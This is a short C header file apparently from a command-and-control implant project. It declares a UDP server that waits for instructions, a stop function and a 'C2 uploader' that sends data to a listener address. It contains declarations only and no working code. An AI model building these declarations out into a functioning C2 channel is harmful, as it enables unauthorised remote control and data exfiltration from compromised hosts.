#ifndef NETWORK_UTILS_H
#define NETWORK_UTILS_H

#include "../include/system_utils.h"

/**
 * Stop the server
 * 
 * Changes the value of the semaphore to stop the server
 * 
 * Returns - OK or ERROR
 */
int stop_server(char *ip, int port);

/**
 * UDP Server
 *
 * Waits for instructions from the server
 *
 * port - Integer with the port we want to use
 *
 * Returns - The data or NULL in case of error
*/
int start_server(int port);

/**
 * C2 uploader
 *
 * It uploads generic data to the specified ip
 *
 * ip_addr - String with ip address of the listener
 * data - Data to send to the server
 *
 * Returns - The number of bytes sent or -1 in case of error with errno set appropriately
*/
size_t upload_data(char *ip_addr, int port, unsigned char *data, size_t len);

#endif